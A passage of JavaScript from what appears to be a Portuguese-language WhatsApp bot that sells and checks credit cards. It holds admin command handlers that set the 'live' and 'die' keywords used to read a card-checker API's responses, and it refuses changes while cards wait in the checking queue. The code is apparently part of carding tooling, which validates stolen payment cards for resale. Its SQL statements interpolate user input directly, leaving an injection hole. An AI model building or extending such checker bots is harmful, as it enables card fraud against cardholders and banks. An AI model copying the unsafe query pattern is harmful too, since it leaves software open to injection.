'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/palavralivepri2===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                FILA_DE_CC_A_CHECAR = await DataBase_Better.prepare(`SELECT _rowid_,* FROM CHECAR_CC_V2 WHERE PROCESSADO = '1' OR PROCESSADO = '3' OR PROCESSADO = '7' OR PROCESSADO = '13' LIMIT 1`).all()
                if (FILA_DE_CC_A_CHECAR.length > 0) {
                    Texto = `Não pode mexer nas configurações de checker enquanto tem CC na fila sendo checada... Tente daqui a 10 segundos ou coloque o Bot em manutenção para que ninguém compre mais até que você configure.`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                CHK_PALAVRA_DIE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE'`).get()["VALOR"]
                CHK_PALAVRA_DIE2 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE2'`).get()["VALOR"]
                CHK_PALAVRA_LIVE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE'`).get()["VALOR"]

                CHK_PALAVRA_LIVE2_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE2'`).get()["VALOR"]
                CHK_PALAVRA_LIVE2 = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${CHK_PALAVRA_LIVE2}' WHERE PARAMETRO = 'CHK_PALAVRA_LIVE2'`).run()

                Texto = `*PRIMEIRA PALAVRA A DETECTAR, CASO DÊ LIVE, FOI ALTERADA! (API PRIMÁRIA)*

*1º PALAVRA AO RETORNAR LIVE*

*ANTES:* ${CHK_PALAVRA_LIVE2_Ant} 🔄
*AGORA:* ${CHK_PALAVRA_LIVE2} ✅

────────────────


*PALAVRAS QUANDO LIVE* ✅

*1º PALAVRA QUANDO LIVE:* ${CHK_PALAVRA_LIVE}
*2º PALAVRA QUANDO LIVE:* ${CHK_PALAVRA_LIVE2}


*PALAVRAS QUANDO DIE* ❌

*1º PALAVRA QUANDO DIE:* ${CHK_PALAVRA_DIE}
*2º PALAVRA QUANDO DIE:* ${CHK_PALAVRA_DIE2}
`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/palavradiepri1===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                FILA_DE_CC_A_CHECAR = await DataBase_Better.prepare(`SELECT _rowid_,* FROM CHECAR_CC_V2 WHERE PROCESSADO = '1' OR PROCESSADO = '3' OR PROCESSADO = '7' OR PROCESSADO = '13' LIMIT 1`).all()
                if (FILA_DE_CC_A_CHECAR.length > 0) {
                    Texto = `Não pode mexer nas configurações de checker enquanto tem CC na fila sendo checada... Tente daqui a 10 segundos ou coloque o Bot em manutenção para que ninguém compre mais até que você configure.`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                CHK_PALAVRA_LIVE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE'`).get()["VALOR"]
                CHK_PALAVRA_LIVE2 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE2'`).get()["VALOR"]
                CHK_PALAVRA_DIE2 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE2'`).get()["VALOR"]

                CHK_PALAVRA_DIE_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE'`).get()["VALOR"]
                CHK_PALAVRA_DIE = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${CHK_PALAVRA_DIE}' WHERE PARAMETRO = 'CHK_PALAVRA_DIE'`).run()

                Texto = `*PRIMEIRA PALAVRA A DETECTAR, CASO DÊ DIE, FOI ALTERADA! (API PRIMÁRIA)*

*1º PALAVRA AO RETORNAR DIE*

*ANTES:* ${CHK_PALAVRA_DIE_Ant} 🔄
*AGORA:* ${CHK_PALAVRA_DIE} ✅

────────────────


*PALAVRAS QUANDO LIVE* ✅

*1º PALAVRA QUANDO LIVE:* ${CHK_PALAVRA_LIVE}
*2º PALAVRA QUANDO LIVE:* ${CHK_PALAVRA_LIVE2}


*PALAVRAS QUANDO DIE* ❌

*1º PALAVRA QUANDO DIE:* ${CHK_PALAVRA_DIE}
*2º PALAVRA QUANDO DIE:* ${CHK_PALAVRA_DIE2}
`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/palavradiepri2===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                FILA_DE_CC_A_CHECAR = await DataBase_Better.prepare(`SELECT _rowid_,* FROM CHECAR_CC_V2 WHERE PROCESSADO = '1' OR PROCESSADO = '3' OR PROCESSADO = '7' OR PROCESSADO = '13' LIMIT 1`).all()
                if (FILA_DE_CC_A_CHECAR.length > 0) {
                    Texto = `Não pode mexer nas configurações de checker enquanto tem CC na fila sendo checada... Tente daqui a 10 segundos ou coloque o Bot em manutenção para que ninguém compre mais até que você configure.`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                CHK_PALAVRA_LIVE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE'`).get()["VALOR"]
                CHK_PALAVRA_LIVE2 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE2'`).get()["VALOR"]
                CHK_PALAVRA_DIE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE'`).get()["VALOR"]

                CHK_PALAVRA_DIE2_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE2'`).get()["VALOR"]
                CHK_PALAVRA_DIE2 = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${CHK_PALAVRA_DIE2}' WHERE PARAMETRO = 'CHK_PALAVRA_DIE2'`).run()

                Texto = `*PRIMEIRA PALAVRA A DETECTAR, CASO DÊ DIE, FOI ALTERADA! (API PRIMÁRIA)*

*1º PALAVRA AO RETORNAR DIE*

*ANTES:* ${CHK_PALAVRA_DIE2_Ant} 🔄
*AGORA:* ${CHK_PALAVRA_DIE2} ✅

────────────────


*PALAVRAS QUANDO LIVE* ✅

*1º PALAVRA QUANDO LIVE:* ${CHK_PALAVRA_LIVE}
*2º PALAVRA QUANDO LIVE:* ${CHK_PALAVRA_LIVE2}


*PALAVRAS QUANDO DIE* ❌

*1º PALAVRA QUANDO DIE:* ${CHK_PALAVRA_DIE}
*2º PALAVRA QUANDO DIE:* ${CHK_PALAVRA_DIE2}
`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳




        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/palavralivesec1===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                FILA_DE_CC_A_CHECAR = await DataBase_Better.prepare(`SELECT _rowid_,* FROM CHECAR_CC_V2 WHERE PROCESSADO = '1' OR PROCESSADO = '3' OR PROCESSADO = '7' OR PROCESSADO = '13' LIMIT 1`).all()
                if (FILA_DE_CC_A_CHECAR.length > 0) {
                    Texto = `Não pode mexer nas configurações de checker enquanto tem CC na fila sendo checada... Tente daqui a 10 segundos ou coloque o Bot em manutenção para que ninguém compre mais até que você configure.`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }
                CHK_PALAVRA_DIE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE_SECUNDARIO'`).get()["VALOR"]
                CHK_PALAVRA_DIE2 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_DIE2_SECUNDARIO'`).get()["VALOR"]
                CHK_PALAVRA_LIVE2 = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE2_SECUNDARIO'`).get()["VALOR"]

                CHK_PALAVRA_LIVE_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CHK_PALAVRA_LIVE_SECUNDARIO'`).get()["VALOR"]
                CHK_PALAVRA_LIVE = msg[1]
                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${CHK_PALAVRA_LIVE}' WHERE PARAMETRO = 'CHK_PALAVRA_LIVE_SECUNDARIO'`).run()

                Texto = `*PRIMEIRA PALAVRA A DETECTAR, CASO DÊ LIVE, FOI ALTERADA! (API SECUNDÁRIA)*

*1º PALAVRA AO RETORNAR LIVE*

*ANTES:* ${CHK_PALAVRA_LIVE_Ant} 🔄
*AGORA:* ${CHK_PALAVRA_LIVE} ✅

────────────────


*PALAVRAS QUANDO LIVE* ✅

*1º PALAVRA QUANDO LIVE:* ${CHK_PALAVRA_LIVE}
*2º PALAVRA QUANDO LIVE:* ${CHK_PALAVRA_LIVE2}


*PALAVRAS QUANDO DIE* ❌

*1º PALAVRA QUANDO DIE:* ${CHK_PALAVRA_DIE}
*2º PALAVRA QUANDO DIE:* ${CHK_PALAVRA_DIE2}
`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
